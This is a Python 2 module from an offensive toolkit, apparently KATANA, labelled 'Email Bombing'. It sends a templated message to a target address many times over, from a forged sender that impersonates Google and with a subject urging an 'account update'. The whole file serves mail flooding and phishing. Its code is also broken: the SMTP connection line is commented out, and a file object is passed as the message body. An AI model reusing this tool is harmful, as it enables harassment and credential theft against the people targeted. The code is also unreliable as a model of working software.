# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# @KATANA                    #
# Modules   : Email Bombing  #
# Script by : RedToor        #
# Date      : 27/08/2015     #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Katana Core                #
from core.design import *    #
from core import help        #
from core import ping        #
d=DESIGN()                   #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Libraries                  #
import smtplib               #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Default                    #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
defaultfrom="notification.center@mail.google.com"
defaultdest="target@services.com"
defaultsubj="Update your account soon - Google Services"
defaulttemp="files/tmtSMTP/updateaccount.template"
defaultmany="30"
# :-:-:-:-:-:-:-:-:-:-:-:-:- #

def run(para,parb,parc,pard,pare):
	global defaultfrom,defaultdest,defaultsubj,defaulttemp,defaultmany
	defaultfrom=para
	defaultdest=parb
	defaultsubj=parc
	defaulttemp=pard
	defaultmany=pare
	smtpbombing(1)

def smtpbombing(run):
	global defaultfrom,defaultdest,defaultsubj,defaulttemp,defaultmany
	try:
		if run!=1:
			actions=raw_input(d.prompt("eng/mailboom"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("target","yes","E-mail target",defaultdest)
			d.descrip("from","yes","E-mail fake",defaultfrom)
 			d.descrip("subjet","yes","Subject fake",defaultsubj)
 			d.descrip("tempte","yes","Template",defaulttemp)
			d.descrip("many","no","Amount to send",defaultmany)
			print ""
			smtpbombing(0)
		elif actions[0:10] == "set target":
			defaultdest = actions[11:]
			d.change("target",defaultdest)
			smtpbombing(0)
		elif actions[0:8] == "set from":
			defaultfrom = actions[9:]
			d.change("from",defaultfrom)
			smtpbombing(0)
		elif actions[0:10] == "set subjet":
			defaultsubj = actions[11:]
			d.change("subjet",defaultsubj)
			smtpbombing(0)
		elif actions[0:10] == "set tempte":
			defaulttemp = actions[11:]
			d.change("tempte",defaulttemp)
			smtpbombing(0)
		elif actions[0:8] == "set many":
			defaultmany = actions[9:]
			d.change("tempte",defaultmany)
			smtpbombing(0)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
		elif actions=="run"  or actions=="r":
			d.run()
			i=int(defaultmany)
			try:
				with open(defaulttemp,'r') as body:
					while 0 < i:
						i-=1
						try:
							#smtp = smtplib.SMTP('127.0.0.1', 1024)
						 	smtp.sendmail(defaultfrom, defaultdest, body) 
						 	if True:
						 		print " "+Suf+" ("+str(i)+")E-Mail was sent."
						except:
						 	print " "+Bad+" ("+str(i)+")E-mail not was sent."
					print ""
			except:
				d.arcnot(defaulttemp)
				smtpbombing(0)
		else:
			d.nocommand()
	except:
		d.kbi()
		exit()
	smtpbombing(0)